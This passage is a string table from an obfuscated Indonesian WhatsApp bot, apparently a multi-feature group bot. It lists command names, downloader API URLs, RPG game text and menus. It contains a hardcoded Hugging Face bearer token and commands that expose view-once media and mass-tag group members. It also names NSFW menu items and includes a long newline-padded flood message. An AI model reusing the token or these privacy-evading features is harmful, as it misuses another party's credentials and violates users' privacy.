'What\'s the point of us being close yesterday?\x0a~Vinaa', 'Pine Valley', 'imageMessage', 'ffmpeg -i ', 'syifa', 'mlstalk', '⚡ Sewa ⚡', 'remoteJid', 'data', 'Masukkan pertanyaan!\x0a\x0a*Contoh:* Siapa presiden Indonesia?', 'mimetype', 'metalh', 'horror2', 'Error', ' https://youtu.be/dhYOPzcsbGM', '* jumlah untuk dijual\x0a\x0aContoh *', 'stop -- _menghentikan sesi chat_', 'carbon', ' nomor\x0aContoh ', 'add', '30% Semangat Kaka Merawat Dirinya><', 'instatv', 'Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya', 'fortress city', 'pushName', 'gaycek', 'delttt', 'Balance Tidak Mencukupi, Kumpulkan Terlebih Dahulu\x0aKetik ', 'autoaijapri', '70 Bulan Lagi', 'darkjoke', 'gdrive', 'audio/mp3', 'HH:mm:ss z', 'cewekasiamenu', '🛠️ *Ingot Ore* : ', '#smeme', 'https://skizo.tech/api/randommeme?apikey=', 'Done Bruh\x0aWaktu Selesai ', 'keluar', '\x0aTime ', '╭─▸ *LIST STYLE*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *style-1*\x0a│2 ▸ *style-2*\x0a│3 ▸ *style-3*\x0a│\x0a╰────────────˧', 'Legends 4', ' juna|sv uy udh gw sv back', 'Meadow', 'HH:mm:ss', 'Silahkan Cek Di Private Chat:v', 'delsetd', '*glow-rainbow (Text)*\x0a│25 ▸ ', '𝐀𝐫𝐢𝐟𝐳𝐲𝐧', 'profile', '\x0a*Link:* ', 'glitter7', '-af volume=12', '-filter:a \"atempo=1.63,asetrate=44100\"', 'Veritas', 'afk', 'nominal', 'Caerleon', '*woodblack (Text)*\x0a│13 ▸ ', 'bisakah', '\x0aWafat Pada Umur : ', 'delsetp', '* Diblokir', 'purpleg', 'Wingston', '\x0a\x0aArti Dalam Bahasa Inggris : ', 'image/jpeg', '*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*', 'Tidak ada sesi yang berlangsung', 'nameOfSurah', 'noeltext', 'sfeVFOlWvlo5Hd9x', 'koifish', 'lirik', ' iron 2\x0a 1 Iron = 15000 Money', ' nya 😋', 'msg', 'headers', '\x0a\x0aKetik *nyerah* untuk menyerah dan mengakui kekalahan', '\x0a ┊ Sales Results : $', 'Gold 1', '@vitalets/google-translate-api', 'balance, untuk mengecek Balance mu!', 'bcvn', 'video/mp4', 'Game telah berakhir', 'Sukses, group telah dibuka', 'hours', ' https://www.instagram.com/reel/Cr5AXBQvBC1/?igshid=MzRlODBiNWFlZA==', 'Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa', 'anticall', 'buka', 'readvo', 'Udah off', 'tentacles', 'newyear', ' Lisaa', ', dengan Nominal: *$ ', '🎢 *Coal* : ', '\x0a\x0a*Terima kasih telah menjalankan misi ini*', ' di laptop ngeliatin gw, ', '*\x0a\x0a_Untuk mengambil video silahkan kirim pesan sesuai list video di atas_', 'Berhasil Mendapatkan Ikan . . .', 'instavideo', 'Kirim/Reply Image Dengan Caption ', 'ojek', 'textcakes', ' Group\x0a\x0a', 'alquranaudio', 'Asu', 'sendMessageFromContent', 'hope-boy', 'kitsune', 'https://telegra.ph/file/c8fdfc8426f5f60b48cca.jpg', 'Pertanyaan : ', ' *teks open*\x0a\x0a_Contoh_\x0a\x0a', 'bread', '\x0aTahun : ', 'firework', 'GrandMaster ✯', 'sendTextWithMentions', 'Anda Tidak Memiliki Cukup Besi Untuk Transaksi Ini', 'sweet-andy', '60% Hai Cantik🐊', 'teli', 'key', './database/casino/', 'sparkling6', '𝐒𝐤𝐢𝐳𝐨 𝐓𝐞𝐚𝐦', ' query\x0a\x0aContoh penggunaan:\x0a', 'thunder2', 'pow', 'nickname', 'tesi', '.yteka', '\x0a• USER : ', '9️⃣', './database/list-message.json', 'Ini bukan pesan view-once.', 'cochher sea', 'Done Bruh Kalo Jelek Maapin Ya:<', 'padEnd', 'layered', 'nicholas', '𝐘𝐚𝐧𝐳𝐃𝐞𝐯', 'yt-search', 'ytesi', 'sendStickerFromUrl', 'nightsky', 'companylogo2', 'Not careful', '_Menfess telah diterima, sekarang kamu bisa chatan lewat bot ini_\x0a\x0a*NOTE :*\x0aJika ingin berhenti dari menfess, silahkan ketik .stopmenfess', 'ago', 'Grup Akan Dibuka Dalam ', '4 Tahun Lagi', 'ceklimit', 'antiwame2', 'path', ' saya menjadi presiden', 'https://api.arifzyn.com/api/download/fb2?url=', 'groupAcceptInvite', 'https://worker.rmdni.id/downloader?url=', 'Aramoor', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891', 'PLAYING', 'infobot', 'Tag/reply number to unban', './media/Astaghfirullah.mp4', 'readdir', 'inventori', 'Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu', 'ArifKey', ' gw ... ', 'fish', 'Gajadi, Kamu ownerku', 'stikmeme', 'Legends 8', '7XAslYf', 'Pesan berhasil dikirim ke nomor tujuan. Moga aja dibales coy', 'followingCount', ' jam ', '5️⃣', 'https://api.zeeoneofc.my.id/api/islam/asmaulhusna?apikey=', ' dandelion', 'Ijin Pushkontak Om', 'listlogoaccording', 'listgc', 'https://api.shinoa.xyz/api/dowloader/fbdown?url=', 'neon_light', 'https://telegra.ph/file/6880771a42bad09dd6087.jpg', '*ID :* @', 'antilink', 'src', '\x0a ┊ *EXP :* ', 'robot', ' gold 2\x0a 1 Gold = 50000 Money', 'ttp', 'Google Search From : ', '\x0a❌: @', '65 Hari Lagi', 'https://api.arifzyn.xyz/download/ytmp3?url=', 'Lingmell', 'start -- _Mencari partner_', '𝙎𝙥𝙤𝙩𝙞𝙛𝙮𝘿𝙤𝙬𝙣𝙡𝙤𝙖𝙙', '_currentTurn', 'Bearer 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', ' ingot kamu belum cukup, minimal 2 ingot', 'Err: ', './media/sound/sc.mp3', 'mama_gina', '*Expire :* ', 'Cek inventory anda dengan cara ketik ', '4707095idDqQp', 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36', '\x0a*ID :* ', 'ytekatu', 'audio_di_bagian_menu', 'mediafire', 'chatgpt2', 'naruto-banner', ' potion 2\x0a 1 Potion = 100000 Money', ' balance', '#gamemenu', 'diff', 'peridot', 'Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu', 'chalk', 'Nominal Harus Berupa Angka!', ' Apa itu chatgpt', 'caklontong', './database/antilink.json', 'HEAD', 'fakeObj', 'bio', 'gojosatoru', '#left', ' ke ', 'brazzers', '*Most Command Global*\x0a', 'Sukses ubah set open teks!', '*battlegrounds-logo (Text1) | (Text2)*\x0a│55 ▸ ', ' GB (', 'Jangan tag, dia sedang afk\x0a\x0a*Reason :* ', 'messages.update', ' jj epep', 'Khusus Premium!', 'reply', 'Siap Laksanakan', 'lesbicek', '\x0aTanpa Bio/status/info || \x0aHey there! I am using WhatsApp.\x0a', 'differentme2', 'SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=', 'Master ✩', 'Hubungan kita hanya sampai dilisan, tidak sampai dipertemukan.\x0a*BY PUTRI*', 'Tebak Gambar', 'checkPremiumUser', '#voicechanger', '41% Semangat:)', 'glitch', 'Sorry,gue ga kuat buat semuanya ,mksi ya\x0a\x0a*BY PUTRI*', 'madara', '\x0a\x0aSilahkan ketik ', '\x0aPesan : ', 'ʟᴏᴀᴅɪɴɢ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ...', '_*Info Gempa*_\x0a\x0a*• Tanggal :* ', 'Proses', 'botinfo', 'smeme', ' text\x0a\x0aContoh : ', 'texthalloween', './lib/tictactoe', '#cogan', 'Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali', 'https://api.zeeoneofc.my.id/api/downloader/instagram-video?url=', ' jumlah yg ingin di jual\x0a\x0aContoh ', 'twdl', '.yteki', 'avatar2', 'XznKey', 'Halo Kak, Penulisan Teksnya Tersebut Salah, Mungkin Terlalu Panjang', 'api', 'Rate : ', 'Sukses kick target✅', 'menus', '*IMAGE LIST :*\x0a\x0a', 'ments', 'tanggal', 'includes', 'textoncup2', '╭─▸ *LIST BACKGROUND*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *1*\x0a│2 ▸ *2*\x0a│3 ▸ *3*\x0a│4 ▸ *4*\x0a│5 ▸ *5*\x0a│6 ▸ *6*\x0a│7 ▸ *7*\x0a│8 ▸ *8*\x0a│9 ▸ *9*\x0a│10 ▸ *10*\x0a│11 ▸ *11*\x0a│12 ▸ *12*\x0a│13 ▸ *13*\x0a│14 ▸ *14*\x0a│15 ▸ *15*\x0a│16 ▸ *16*\x0a│17 ▸ *17*\x0a│18 ▸ *18*\x0a│\x0a╰────────────˧', 'Tiba-tiba Ada ', 'rainbow-shine', '\x0a👤Channel : ', 'chocolate', '\x0a*Sisa Ayam* : ', 'Lowestoft', 'butterfly-reflection', 'Set welcome already active', '*Sisa ikan:* ', 'POST', 'Kntl', 'wa.me', 'Garmsby', 'name', 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=', ' _Second_ \x0a\x0a_Info Server_\x0aRAM: ', ' Di Mulai Dari Sekarang', 'list', 'tafsir', 'inv', 'Tebak Kata', '💬 Caption : ', './sticker/', 'https://api.zeeoneofc.my.id/api/textpro/', 'Sukses', '*underwater-ocean (Text)*\x0a│39 ▸ ', 'bannerofapex', 'Nearon', 'string', ' @6285600793871 2000', '-filter_complex \"areverse\"', '. @', 'akira', 'rose', 'parse', 'sendVideo', 'Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg', 'addsewa', 'rate', './database/image.json', 'timestamp', 'Gajadi, Karena kamu ngirim link group ini', ' Users', 'killdemon', './lib/scraper', './media/sound/kenapa.mp3', '\x0a*Title*: ', '*Wounded* : ', 'setproses', './datanya/anime/asuna', 'Nickname : ', 'store', '62% Kakak Cantik><', 'Glenarm', 'done', 'Nuxvar', 'Terima kasih karena kamu aku menjadi lupa tentang masa laluku', 'Khusus user aja bkn untuk owner', '12PKkqNL', 'parse-ms', 'joker', 'tiktoknowm', 'randomquran', 'demon', '*vintage-style (Text)*\x0a│29 ▸ ', './datanya/anime/hestia', 'start -- _mencari partner_', ' 00:00:00', './lib/mlstalk', 'bagi', 'readdirSync', ' .menu', './lib/spotify', 'Sorry this video can\'t be download', '* untuk ', 'juz', ' detik\x0aJika Anda Merasa Ga Mampu Silahkan Ketik .ytelo', 'listvid', 'transfer', 'itori', '&template=', './lib/remini', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059', '*khusus Owner*', ' id group\x0aContoh ', '#waifu', 'ppcp', 'teteb', 'Silver 4', '• *Link* : ', 'honey-text', 'buyglimit', 'sendButtonText', 'time', 'Ketik nama Nabi\x0aContoh : ', 'Sukses unblock @', '.ytete', '86400000', ' 🥈\x0a• @', '*summer-text (Text)*\x0a│42 ▸ ', 'locale', 'mfdl', '* tidak ada di database!', '• @', 'leave', 'Done kak', 'baitfood', ' 1/2', 'fitnah', 'readviewonce', 'changep', 'Sukses delete set welcome', './database/set_done.json', 'saturnus', 'chika', '75 Hari Lagi', 'usedPercentage', 'listsurah', 'sgif', 'creation', '*wooden-board (Text)*\x0a│43 ▸ ', 'comicsearch', 'transformer', './database/set_close.json', 'watermelon', 'default', '╭─▸ *LIST STYLE*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *anubis*\x0a│2 ▸ *cowgirl*\x0a│3 ▸ *dragon*\x0a│4 ▸ *duck*\x0a│5 ▸ *ghost*\x0a│6 ▸ *gorilla*\x0a│7 ▸ *panda*\x0a│8 ▸ *panther*\x0a│9 ▸ *shark*\x0a│10 ▸ *squirrel*\x0a│11 ▸ *tiger*\x0a│12 ▸ *wolf*\x0a│13 ▸ *bee*\x0a│14 ▸ *crocodile*\x0a│15 ▸ *deer*\x0a│16 ▸ *pitbull*\x0a│17 ▸ *horse*\x0a│18 ▸ *hurricane*\x0a│19 ▸ *indian*\x0a│20 ▸ *assassin*\x0a│21 ▸ *boar*\x0a│22 ▸ *rapid*\x0a│23 ▸ *raven*\x0a│24 ▸ *warrior*\x0a│25 ▸ *pikachu*\x0a│26 ▸ *pubg*\x0a│27 ▸ *ninja*\x0a│28 ▸ *drift*\x0a│29 ▸ *yasuo*\x0a│30 ▸ *rhino*\x0a│31 ▸ *phoenix*\x0a│32 ▸ *bull*\x0a│33 ▸ *hornet*\x0a│34 ▸ *eagle*\x0a│35 ▸ *hunter*\x0a│36 ▸ *parrot*\x0a│37 ▸ *rooster*\x0a│38 ▸ *lion*\x0a│39 ▸ *skull*\x0a│40 ▸ *wolver*\x0a│41 ▸ *wolf*\x0a│42 ▸ *cobra*\x0a│43 ▸ *dragon*\x0a│44 ▸ *panther*\x0a│45 ▸ *owl*\x0a│46 ▸ *tiger*\x0a│47 ▸ *reaper*\x0a│48 ▸ *warrior*\x0a│\x0a╰────────────˧', 'open', 'donate', 'buylimit *jumlah* dan ', 'sunglightshadow', '&authuser=0&export=download', '100 Bulan Lagi', 'Tag/reply number to banned', 'Berhasil Menghapus Sesi Casino', 'emilia', 'space3d', '94% Hai Cantik><', 'cumsluts', 'bcaudio', '-af acrusher=.1:1:64:0:log', 'https://api.yanzbotz.my.id/api/downloader/tiktok?url=', 'render', 'contextInfo', 'Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini', '⏧☆⏧ ☠️\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a.', 'autoaigc', './database/left.json', 'Ayrith', '*naruto-banner (Text)*\x0a│46 ▸ ', 'Sukses set done!', ' *text|text2|background*\x0a*Untuk List Background Ketik .list', 'Kamu masih berada dalam sesi menfess', '|enak ga semalem|enak banget', 'JUMLAH SAMPAH SYSTEM\x0a\x0a', 'Maksimal 30 detik', '* ikan', 'vintage-style', 'Public Mode', './database/welcome.json', 'Kecepatan Respon ', 'Berhasil menghapus semua sampah', 'Kirim perintah *', '\x0aId : ', 'glossyb', 'Successfully Activate Antilink In This Group', '-filter_complex \"afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75\"', ',\x0aitem1.TEL;waid=', './database/user/hasil_buruan.json', 'tambah', 'json', '𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨 :', 'projectyasuo', 'blueneon', 'army-camouflage', 'slime', 'Successfully Activate antilink2 In This Group', '*vector-nature (Text)*\x0a│36 ▸ ', './datanya/anime/itori', 'appenTextMessage', '*Pilih:*\x0adetik\x0amenit\x0ajam\x0a\x0a*Example*\x0a10 detik', ' Halo semuanya', './datanya/anime/erza', '.tmp', 'tipe', 'in kel', 'chatModify', 'rem', '#rpgmenu', 'apk', 'inferenceengine', 'Ampleforth', '#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1', 'groupSettingUpdate', 'bot', 'SHA256 Hash Missing', 'binary', 'spotify', 'fotoDonasi', 'downloadmenu', 'Reply Pesannya!!', '&style=', 'jewelry6', 'dino-kuning', 'steel', './datanya/anime/kakasih', '30 Bulan Lagi', ' chicken 2\x0a 1 Chicken = 2500 Money', 'marble', '#tes', 'message.delete', '* \x0a⏰ Durasi: ', './datanya/anime/kaga', 'media', 'GrandLegends 忍⁴', 'wuyifan', 'https://telegra.ph/file/44fc684be9865c0fcb5fa.jpg', 'bagel', 'audio', 'https://api.zahwazein.xyz/randomimage/cosplay?apikey=', '*rainbow-text (Text)*\x0a│18 ▸ ', 'Masukan Nominal Nya', '*Misi kill Goblin*\x0a\x0a🎁 *Hadiah untuk killing Goblin*\x0a ┊ *Money:* $', '#revoke', '_HUNT RESULT_\x0a\x0a', ' *judul*\x0a\x0a_Contoh_\x0a\x0a', 'loli', 'woodblack', 'Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja', '*\x0a\x0a_Untuk mengambil image silahkan kirim pesan sesuai list image di atas_', '「 BROADCAST 」\x0a\x0a', 'thailand', 'GrandLegends 1', 'sell', 'gzip, deflate, br', 'getAfkTime', 'isuzu', 'translation', 'Sisa Uang Anda Tidak Cukup Untuk Pembelian Ini', 'killslime', ' Bila Nanti', 'nsfwmenu', '#setleft', ' apa itu openai', '#convertmenu', './database/banned.json', 'setopen', ' saya wibu', 'setcmd', '\x0aWaktu : ', 'bandwidth', 'jual', 'marble2', 'listbanned', '\x0aHari Kelahiran : ', 'wangy Juna', 'from', 'Successfully Activate Auto AI', 'antiwame', 'erokitsune', 'nama', 'push', 'rabbit', ' Menantang ', 'readFileSync', '\x0a\x0aKirim perintah .tebaktebakan untuk bermain lagi 🎮', ' hour(s) ', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3', 'picture', '?apikey=', ' *key*\x0a\x0a_Contoh_\x0a\x0a', 'randommenu', 'prefix', 'chat.whatsapp.com', 'cookie', '*Jumlah ikan dijual:* ', 'elephant', 'sendprofile', './datanya/anime/emilia', 'PHOTO', 'smooth', 'listbanneroflol', 'https://telegra.ph/file/bd662563855328a1832e6.jpg', '\x0a*Member :* ', 'funmenu', 'INQUIRY', './mess.json', 'mangayutri', 'score', 'https://telegra.ph/file/92967f55b1f437fdd55fe.jpg', 'endsWith', 'ayuzawa', 'Norwich', 'lovecard', 'shiny', '*kayu selama 2 menit', ' *url*', './database/openaigc.json', 'groupCreate', 'Gambar diatas adalah game?\x0a\x0aWaktu : ', 'Maksimal 20 karakter', 'Bot sudah disewa oleh grup tersebut!', '\x0a\x0aKirim perintah .tebe untuk bantuan dan .ytebe untuk menyerah 🎮', 'bcsewa', 'Jarren’s', 'simiv', 'Prosess Bosku', 'shakemap', ' Anime', 'dbc', 'recolor', 'Carlisle', '*Location* : ', 'Legends 忍¹', 'numberOfSurah', './lib/y2mate', 'jpg', ' *text|hero*\x0a*Untuk List Hero Ketik .list', 'GrandLegends', 'Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36', 'Prompt: ', 'singleSelectReply', 'Tywardreath', 'Arkney', ' Menang!', 'Nyerah', ' GB\x0a *• Used :* ', 'buyprem', 'voicechanger', ' Halo Semuanya, group sudah buka', './datanya/anime/boruto', 'Wigston', 'kategori', 'linkgc', 'webm', '❌ Terjadi kesalahan', 'Successfully Disabling Kickme In This Group', 'Successfully Activate antidelete In This bot', 'japriOnly', 'rikagusriani', 'Self Mode', '\x0a⏰ *Clock* : ', 'https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json', 'OpenAIKey', 'hidetag', 'neon_devil', '#textpromenu', 'Meteor', 'sendText', '\x0a\x0aKirim perintah .tekateki untuk bermain lagi 🎮', 'neko', './media/sound/anjay.mp3', 'updateProfilePicture', 'Aucteraden', 'tekatu', 'rosebirthday', 'jiso', 'Eanverness', 'listpubglogomaker', 'teki', '\x0a=> Balance : $', 'ytebe', 'Pitmerden', 'Kirim/reply image dengan caption ', 'balloon7', '\x0a*>* Download : ', 'mine', 'split', 'listvn', 'antiviewonce', '*√ DASHBOARD*\x0a\x0a*HIT*\x0a• GLOBAL : ', '#addprem', 'Transaksi Berhasil ✅\x0a*Sisa uang* : ', 'messages.upsert', 'pppanjang', 'popoci', 'https://vihangayt.me/download/ytmp4?url=', 'femdom', 'Kamu mendapatkan *', 'auto_welcomeMsg', 'kickme', 'Gajadi, Kamu admin', 'https://telegra.ph/file/d888041549c7444f1212b.jpg', '#say', '.png', 'playerO', '\x0a*• Number :* ', '.tekatu', 'https://wibu-api.eu.org/api/lk21/search?title=', ' Sampah\x0a\x0a', './datanya/anime/minato', '\x0aあ Title : ', 'application/zip', 'Kamu Masih Berada Di dalam Sesi Anonymous\x0a\x0a', './lib/premium', 'Pelangimu mungkin banyak warna. Tapi, tak ada warna yang membuat dia menaruh rasa.\x0a*BY PUTRI*', 'watercolor2', 'coolwg', ', blood - 10\x0a', 'download', 'allmenu', '\x0a🕹️ Limit Game : ', '「 Game Casino Rejected 」\x0a\x0a• @', 'minion', 'Reply video dengan caption ', 'botName', 'autobio', '\x0a\x0aKirim perintah .tebakgame untuk bermain lagi 🎮', ' Chat\x0aWaktu Selesai ', 'doge', 'kakasih', '*carvedwood (Text)*\x0a│7 ▸ ', './media/sadpodcast/3.mp3', 'cutegirlgamer', '\x0a➕ 💹Menerima gaji....\x0a', '55 Bulan Lagi', 'Send/Reply Foto Dengan Caption ', './database/autodlgc.json', 'cum', ' Saya Mati', '𝐌𝐲 𝐏𝐚𝐫𝐞𝐧𝐭𝐬', 'Cromerth', '90 Bulan Lagi', 'water_pipe', 'BotAdmin', 'Warcester', 'OnlyOwner', 'aigrup', 'Tsunami', 'undefined', 'addvn', '1658703206', ' 1\x0a\x0aKetik .listsurah Untuk Melihat Daftar Surat', 'foliokanan', ' kamu tidak punya bahankimia', 'ttmp3', '\x0aFullname : ', 'nameonheart', './lib/ffstalk', 'freemem', ' *text|text2|icon*\x0a*Untuk List Icon Ketik .list', './datanya/anime/sagiri', 'Contoh ', 'cuckold', '\x0a\x0a──────────────\x0a\x0a', 'instareels', ' Menit ', 'DriveWebUi', ' stone kamu belum cukup, minimal 2 stone', 'shadow-sky', 'wolf_g', '.yteli', 'Amazon forest', '#bcsewa', 'https://telegra.ph/file/eabfc907cfc447386b0c0.jpg', 'blown', '8️⃣', 'resize', 'Carran', 'mulai', '20 Bulan Lagi', 'sendFile', 'ytsearch', 'Hanky Panky', '#randommenu', 'avataroverwatch', 'listanonymous', '#listpremium', 'Balas audio yang ingin diubah dengan caption *', './database/user/buruan.js', 'saweria', 'https://api.zeeoneofc.my.id/api/image-effect/instagram2?apikey=', 'DD/MM/YYYY HH:mm:ss', 'pathimg', 'Scratched by a wild animal', 'query', '𝐒𝐲𝐚𝐢𝐢', 'say', 'png', 'Venzor', 'GrandMaster ✩', 'videoId', 'concat', 'CHATTING', 'photo_profile', 'Hanya bisa digunakan di dalam grup', '*Pilihan Fitur Nulis*\x0a1. ', 'ytega', 'Contoh :\x0a\x0a1. Kirim perintah ', 'Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki', 'skip -- _mencari partner lain_\x0a', 'Hanya yang sabar yang mampu melewati semua kekecewaan', 'kamu mendapatkan *', 'https://skizo.tech/api/ssweb?type=phone&url=', 'jpeg', ' store', ' Kasih Jeda Ya Om:3*', 'Sukses block @', 'foliokanan\x0a\x0aContoh:\x0a', 'mtype', 'Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri', 'dropwater', 'limit', 'tebakkalimat', 'Hogsfeet', 'delvira', 'addphoto', ' https://vt.tiktok.com/ZS8KdFQcQ/', '*nightsky (Text)*\x0a│24 ▸ ', '\x0a\x0a_NodeJS Memory Usaage_\x0a', ' *kode bahasa* *teks*\x0a• Contoh : ', 'https://api-inference.huggingface.co/models/stablediffusionapi/lyrielv16', './lib/respon-list', '*🧪 Potion* : ', 'jewelry5', 'slow', '⚠️ Kamu belum pernah memulai chat!\x0a\x0a', ' off -- _Menonaktifkan_', 'xmas', 'Linknya salah', 'buy', 'conversation', 'nezuko', 'balloon4', 'cekcantik', '.ai', 'advanced', 'nowm', '.tega', ' https://open.spotify.com/track/6cHCixTkEFATjcu5ig8a7I', 'carvedwood', 'triggered', '\x0a*Ingot didapat:* ', 'Maaf Bot Tidak Bisa Menjawab', 'Silahkan Jawab Pertanyaan Berikut\x0a\x0a', 'family100', 'createWriteStream', 'okhttp/4.9.3', 'asuna', './datanya/anime/madara', 'chats', 'japan', 'Done Bruhh', 'Silahkan Jawab Soal Di Atas Ini\x0a\x0aDeskripsi : ', './datanya/anime/keneki', 'Master ✩✩', 'Fotonya Mana?', 'kemonomimi', './media/sadpodcast/5.mp3', 'papercut', '\x0a*Link :* ', 'Fallen Tree', '*typography-flower (Text)*\x0a│2 ▸ ', 'bcstiker', 'Udh on di group ini', 'Dari sekian lama menunggu apa yang sudah didapat', './datanya/anime/chitanda', 'ceklesbi', 'videolist', 'hidetag ', 'writing', 'https://skizo.tech/api/removebg?url=', 'Nih Kak Cowok Gantengnya 😋', 'nobg', 'Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati', 'mentionedJid', ' *text|cover*\x0a*Untuk List Cover Ketik .list', 'Reply gambar/video yang ingin Anda lihat', 'Silver 5', 'content-type', 'stickergifwm', 'unwatchFile', 'Sorry this video can\'t be download\x0a\x0aPlease try typing .fb3 *url*', '@jam', 'groupmenu', 'jelajah', 'Done!', 'Nominal harus berupa angka!', './datanya/anime/naruto', 'Tarnstead', 'menfess', 'sendPresenceUpdate', '*🐑 Sheep* : ', 'child_process', 'scary-cemetery', 'arrayBuffer', 'chapter', 'Link Download Limit!', ' Halo @user, Selamat tinggal dari @group', 'infinity', 'holographic', 'fb3', 'Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran', 'glass', 